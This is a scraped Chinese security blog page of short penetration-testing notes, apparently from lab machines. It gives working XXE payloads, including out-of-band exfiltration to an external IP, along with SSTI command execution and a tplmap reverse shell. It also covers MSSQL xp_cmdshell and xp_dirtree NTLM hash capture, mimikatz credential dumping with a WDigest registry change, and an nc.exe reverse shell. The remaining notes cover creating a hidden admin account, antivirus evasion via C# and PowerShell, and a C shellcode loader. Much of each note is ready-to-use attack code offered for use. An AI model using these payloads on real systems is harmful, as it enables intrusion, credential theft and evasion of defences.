                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; XXE漏洞详解 &gt;</div>
                            <div class="content flex1">
                                
  0x01、XXE原理：XXE：XML External Entity Injection；即XML外部实体注入（php版本大于5.4.45的默认不解析外部实体）
1、XML：Extensible Markup Language，可扩展标记基础XML被设计用来结构化、存储以及传输信息，且XML 允许创作者定义自己的标签和自己的文档结构。XML的构建模块结构如下：

XML元素

属性

实体     


以一个简单的XXE POC为例：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  ###XML声明
&lt;!DOCTYPE test [                                ####文档类型定义（DTD）
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;     ###定义实体名
]&gt;
&lt;test&gt;&amp;xxe;&lt;/test&gt;   ###文档元素，使用实体名2.DTD（文档类型定义）实体
定义XML文件中有哪些模块，这些模块能包含什么样的内容

DTD可以在XML文档内声明，也可以外部引用


内部声明DTD：
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [        定义此文档是 note 类型的文档。
&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
 &lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
  &lt;!ELEMENT from    (#PCDATA)&gt;     
  &lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body    (#PCDATA)&gt;
]&gt;
&lt;note&gt;
 &lt;to&gt;George&lt;/to&gt;
  &lt;from&gt;John&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;引用外部DTD：
DTD文件内容：
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;
&lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型
&lt;!ELEMENT from    (#PCDATA)&gt;     
&lt;!ELEMENT heading (#PCDATA)&gt;
&lt;!ELEMENT body    (#PCDATA)&gt;引用DTD：
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE root SYSTEM &quot;http://xx.xx.xx.xx/evil.dtd&quot;&gt;
&lt;note&gt;
  &lt;to&gt;George&lt;/to&gt;
  &lt;from&gt;John&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;
&lt;/note&gt;
ELEMENT被过滤的情况下，可以将ELEMENT写入到DTD，外部引用;或外带查询

3、为什么能形成注入？XML 外部实体可以解析外部文件的特性，使得攻击成为可能；当XML允许引用外部实体，关键字“SYSTEM”会令XML解析器从URI中读取内容，并允许它在XML文档中被替换简单的漏洞代码：
&lt;?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents(&apos;php://input&apos;);
$dom = new DOMDocument();

# LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值
# LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
$user = $creds-&gt;user;
$pass = $creds-&gt;pass;
#回显信息
  echo &quot;You have logged in as user $user&quot;;
###漏洞触发点在user元素中
?&gt;0x02、XXE漏洞验证：如上漏洞代码poc，paylaod.txt：
&lt;creds&gt;
&lt;user&gt; Ed &lt;/user&gt;
&lt;pass&gt; mypass &lt;/pass&gt;
&lt;/creds&gt;
tips：读php或html文件时：（由于带有&lt; , &gt;符号会导致解析错误，使用如下paylaod）

&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/xx.php&quot;&gt;curl验证：
curl -d @payload.txt http://localhost/xml_injectable.php显然这里是有回显的情况，无回显判断，一般还会监听一下我们的80端口是否收到对方的访问信息

0x03、XXE能做什么：[1]文件读取
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
[2]SSRF探测端口内网服务
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
尝试在XXE漏洞代码中加入：    error_reporting(0);

上边这个判断方法比较依赖于对方开启报错并回显；有回显但没有开启报错的情况下可以根据响应时间/长度，判断该端口是否已被开启（时间差还是很明显的）
[3]Bind XXE （OOB）外带数据（无回显攻击）
[代码中注释掉 echo “You have logged in as user $user”;]
OOB  文件读取
evil.dtd：
&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &apos;http://47.112.182.89/%file;&apos;&gt;&quot;&gt;payload.txt(按理说是读取php或者html文件才需要base64，可是我这里不经过base是没有信息返回的)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C://windows//system.ini&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
%dtd; %all;
]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
OOB  探测内网端口及服务：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:3389&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;
%dtd; %all;
]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;0x04、攻击内网SSRF+内网服务命令执行实现内网攻击
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/ssrf.php?cmd=xxxxxxx&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;系统命令执行
(PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上时才可用)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;0x05、使用递归实体扩展进行DOS攻击
0x06、XXE漏洞挖掘： 如何判断是否存在XML外部实体攻击?那就是寻找那些接受XML作为输入内容的端点，而有些端点可能并不是那么明显，比如一些仅使用JSON去访问服务的客户端，可以通过修改HTTP的请求或修改Content-Type头部字段等方法，然后看应用程序的响应，看程序是否解析了发送的内容，如果解析了，那么就可能存在XXE攻击漏洞
比如这个案例：https://www.freebuf.com/vuls/167087.html ；通过更改contentn type类型值来fuzz目标是否能够正常响应XML值
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
foo=bar等价于：（一般WAF只会拦截application/x-www-form-urlencoded，通过更改为其他类型如text/xml 或 application/xml可绕过 ）
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;1.文件上传XXE（XML、XLSX，DOCX，PPTX，SVG或任何XML MIME类型格式）
2.传输内容XXE （支持XML）
扩展之Json端点上的XXE：
原始JSON
{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}XML转换(需要添加一个根元素，不然会成为无效的XML文档)
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;root&gt;
&lt;search&gt;name&lt;/search&gt;
&lt;value&gt;netspitest&lt;/value&gt;
&lt;/root&gt;以HTB Fulcrum为例：疑似一个API返回一段json信息，但是我们没有能够与API进行交互的方法，只能尝试各种可能（OS[系统命令注入]、sqli、xxe、xpath等）

成功验证XXE




                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户" href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 调用API绕过杀软添加用户 &gt;</div>
                            <div class="content flex1">
                                
  创建隐藏账户：
net user tw$ password /add  ###用户名为tw，密码为password的
也可以通过修改注册表实现，需要system权限    如何发现隐藏账户：
通过组查看：
net localgroup administrators 
net localgroup users直接查看注册表，有什么用户一目了然HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过
实现：
微软提供C++实现原型：
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, &quot;netapi32.lib&quot;)

#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;
#include &lt;windows.h&gt; 
#include &lt;lm.h&gt;

int wmain(int argc, wchar_t *argv[])
{
   LPGROUP_USERS_INFO_0 pBuf = NULL;
   DWORD dwLevel = 0;
   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
   DWORD dwEntriesRead = 0;
   DWORD dwTotalEntries = 0;
   NET_API_STATUS nStatus;

   if (argc != 3)
   {
  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);
  exit(1);
   }

   nStatus = NetUserGetGroups(argv[1],
  argv[2],
  dwLevel,
  (LPBYTE*)&amp;pBuf,
  dwPrefMaxLen,
  &amp;dwEntriesRead,
  &amp;dwTotalEntries);

   if (nStatus == NERR_Success)
   {
  LPGROUP_USERS_INFO_0 pTmpBuf;
  DWORD i;
  DWORD dwTotalCount = 0;

  if ((pTmpBuf = pBuf) != NULL)
  {
 fprintf(stderr, &quot;\nGlobal group(s):\n&quot;);

 for (i = 0; i &lt; dwEntriesRead; i++)
 {
assert(pTmpBuf != NULL);

if (pTmpBuf == NULL)
{
   fprintf(stderr, &quot;An access violation has occurred\n&quot;);
   break;
}

wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);

pTmpBuf++;
dwTotalCount++;
 }
  }

  if (dwEntriesRead &lt; dwTotalEntries)
 fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);

  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);
   }
   else
  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);

   if (pBuf != NULL)
  NetApiBufferFree(pBuf);

   return 0;
}NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组
我用C实现效果如下：



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="SSTI[服务器模板注入]" alt="SSTI[服务器模板注入]" href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="SSTI[服务器模板注入]" alt="SSTI[服务器模板注入]"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; SSTI[服务器模板注入] &gt;</div>
                            <div class="content flex1">
                                
  漏洞成因：
用户输入未经过滤就交给引擎处理
将python语句编译成一句话： 
不同类型SSTI paylaod: 
SSTI模板注入常见引擎：

判断是哪种类型SSTI

一个实例：
nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI返回输入内容，已知

检测SSTI

name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）
确定是jinja之后，尝试文件读取和命令执行
读取文件
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
命令执行：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}SSTI注入工具tplmap： 
python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="MSSQL NTLM stealer" alt="MSSQL NTLM stealer" href="/2020/04/26/MSSQL-NTLM-stealer/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="MSSQL NTLM stealer" alt="MSSQL NTLM stealer"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; MSSQL NTLM stealer &gt;</div>
                            <div class="content flex1">
                                
  可窃取NTLM的漏洞及利用方式
利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。
如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希
环境说明：https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL SQLi，发现高权限账户但无法读取密码
漏洞利用
默认情况ASP/MSSQL支持堆叠注入：
常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed
猜测是没有权限的问题，想到xp_dirtree外带数据：
payload：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记" href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; mimikatz抓取密码小记 &gt;</div>
                            <div class="content flex1">
                                
  1、直接抓取本机：
[1]#privilege::debug          //提升权限[2]#sekurlsa::logonpasswords  //抓取密码
离线破解lsass.dmp
[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来
[2]#privilege::debug          //提升权限
[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp
[4]#sekurlsa::logonpasswords  //抓取密码
踩坑点：
[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)相对路径报错    
解决方法：lsass.dmp要给完整路径，
[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key importmimikatz版本过低
解决方法：使用2.0版本
[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
windows 2012之后明文抓取均会出现这个报错
需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了
（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="内网使用smb无文件执行" alt="内网使用smb无文件执行" href="/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="内网使用smb无文件执行" alt="内网使用smb无文件执行"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 内网使用smb无文件执行 &gt;</div>
                            <div class="content flex1">
                                
  创建smb共享
mkdir smb &amp;&amp; cd smb
cp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下
sudo impacket-smbserver share $(pwd) -smb2support -user Twe1ve -password  123456测试：
$pass = convertto-securestring &apos;123456&apos; -AsPlainText -Force
$cred= New-Object System.Management.Automation.PSCredential(&apos;Twe1ve&apos;,$pass)
New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.61\share
执行：
Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘

Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="shell中实现runas命令" alt="shell中实现runas命令" href="/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="shell中实现runas命令" alt="shell中实现runas命令"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; shell中实现runas命令 &gt;</div>
                            <div class="content flex1">
                                
  有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果
$pass = convertTo-SecureString &apos;36mEAhz/B8xQ~2VM&apos; -AsPlainText -Force                     
$cred= New-Object System.Management.Automation.PSCredential(&quot;Sniper\Chris&quot;,$pass)
Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证
Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $cred
Invoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  6636 -e cmd.exe } -Credential $cred  ##反弹shell


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="C#底层调用powershell过杀软" alt="C#底层调用powershell过杀软" href="/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="C#底层调用powershell过杀软" alt="C#底层调用powershell过杀软"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; C#底层调用powershell过杀软 &gt;</div>
                            <div class="content flex1">
                                
  这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。
国内某数字杀软，会拦截powershell的运行，以前常用的复制powershell到当前目录执行也被拦截，或者修改empire中的特定函数同样被检测到,很多方式不再适用
从C#中调用
添加运行powershell需要的程序包：
C#调用powershell安装system.management.automation.dll：
管理NuGet程序包-&gt;浏览-&gt;搜索system.management.automation-&gt;选择system.management.automation.dll-&gt;重新生成项目即可
using System;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Management.Automation.Runspaces;
 public class Program
 {
 public static void Main()
 {
 }
 }
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
 public override void Uninstall(System.Collections.IDictionary savedState)
 {
 Mycode.Exec();
 }
 }
 public class Mycode
 {
 public static void Exec()
 {
 string command = System.IO.File.ReadAllText(@&quot;C:\Users\fmc\Desktop\PowerUp.ps1&quot;);
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.Invoke();
 }
 }PS1文件需要适当混淆以过静态查杀



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="C内存加载过杀软" alt="C内存加载过杀软" href="/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="C内存加载过杀软" alt="C内存加载过杀软"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; C内存加载过杀软 &gt;</div>
                            <div class="content flex1">
                                
  C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；
如最常用的加载器：
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)

unsigned char shellcode[] =
&quot;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&quot;
&quot;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&quot;
&quot;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&quot;
&quot;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&quot;
&quot;\x57\x78\x01\xc2\x8b\x7a\x20\x01&quot;
&quot;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&quot;
&quot;\x45\x81\x3e\x43\x72\x65\x61\x75&quot;
&quot;\xf2\x81\x7e\x08\x6f\x63\x65\x73&quot;
&quot;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&quot;
&quot;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&quot;
&quot;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&quot;
&quot;\xb1\xff\x53\xe2\xfd\x68\x63\x61&quot;
&quot;\x6c\x63\x89\xe2\x52\x52\x53\x53&quot;
&quot;\x53\x53\x53\x53\x52\x53\xff\xd7&quot;;
void main()
{
    ((void(*)(void))&amp;shellcode)();
}解决方法1：加密shellcode再解密运行（最后用一些比较偏的加密算法）
解决方法2：pyaload分离[1]借助main的入口参数，用户直接输shellcode
[2]从txt文件中加载shellcode
这个当初比较头疼，因为C语言这方面确实不大行，从txt读取shellcode的时候出现问题;记录如下：

获取txt中shellcode长度，申请内存空间


.使用fread读取txt为字符串，加载难以识别出shellcode    


.fscanf判定shellcode分割符需要进行转义(这点是乔哥解决的，我乔哥还是强啊)




                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                


            </div>
            <div class="swiper-scrollbar"></div>
        </div>
    </div>
</div>
<script>

    function getSwiperPrams() {
        var windowsWidth = $(document).width()
        var slidesPerView
        var direction;
        if(windowsWidth > 1500){
            direction = 'horizontal'
            slidesPerView = 4
        }else if(windowsWidth > 1100){
            direction = 'horizontal'
            slidesPerView = 3
        }else if(windowsWidth > 1000){
            direction = 'horizontal'
            slidesPerView = 2
        }else{
            slidesPerView = 1
            direction = 'vertical'
        }
        return {
            direction: direction,
            slidesPerView: slidesPerView
        }
    }
    var params = getSwiperPrams()

  var mySwiper = new Swiper('.swiper-container', {
    direction: params.direction, // 垂直切换选项
    mousewheel: true,
    slidesPerView: params.slidesPerView,
    spaceBetween: 30,
    scrollbar: {
      el: '.swiper-scrollbar'
    },
    on: {
        resize: function(){

        },
    },

    // 如果需要滚动条
    scrollbar: {
      el: '.swiper-scrollbar',
    },
  })
</script>

  </div>
  <!--
  <div class="main-bottom">
    <div class="music flex flex-pack-justify flex-align-center">
      <div class="control">
        <a onclick="preSong()"><span class="iconfont icon-shangyishou"></span></a>
        <a onclick="playControl()"><span class="iconfont play-icon icon-kaishi1"></span></a>
        <a onclick="nextSong()"><span class="iconfont icon-xiayishou-copy"></span></a>
      </div>
      <div class="msg">
        <span class="time"></span>
        <div class="line" ref="progress-line-warp">
          <div class="song-msg">周杰伦 - 说好不哭</div>
          <!--<div class="current-line" ref="progress-line">
            <a tag="a" class="target" v-on:mousedown.prevent="mousedown"></a>
          </div>-->
        </div>
        <span class="all-time"></span>
      </div>
      <div class="right-control">
        <a class="order-btn flex flex-align-center" onclick="toogleShowMusicList()">
          <span class="iconfont icon-ttpodicon"></span>
          <span class="number flex1">3</span>
        </a>
      </div>
      <audio id="audio" class="mian-audio" src="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3">
        Your browser does not support the audio element.
      </audio>
    </div>
  </div>
  <div class="music-list">
    <div id="musiclist">
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 说好不哭" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3" onclick="changePlayIndex(0)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">说好不哭 - 周杰伦</span>
        </a>
      
